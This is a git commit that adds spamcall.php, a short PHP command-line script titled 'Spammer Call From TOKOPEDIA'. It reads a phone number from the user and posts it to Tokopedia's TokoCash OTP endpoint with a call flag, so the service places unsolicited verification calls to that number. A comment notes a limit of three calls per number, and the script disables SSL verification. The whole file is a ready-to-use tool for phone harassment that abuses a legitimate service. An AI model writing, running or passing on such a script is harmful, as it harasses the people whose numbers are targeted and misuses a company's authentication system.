19f08b2f4a40522655a8846636a4e25a4e2b7959
storiku <50206225+storiku@users.noreply.github.com>
2019-08-10 19:43:59 +0700

    Add files via upload

---
+++ spamcall.php
@@ -0,0 +1,27 @@
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "
+############################################################
+    Spammer Call From TOKOPEDIA
+        Author By   : AyipBontos
+        Support     : Kunjungi Website Kami
+        Website     : https://termux.id
+        Youtube     : Omalip TV
+     Penggunaannya  : Bisa Menggunakan [08/62]
+###########################################################\n";
+echo "Nomor\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
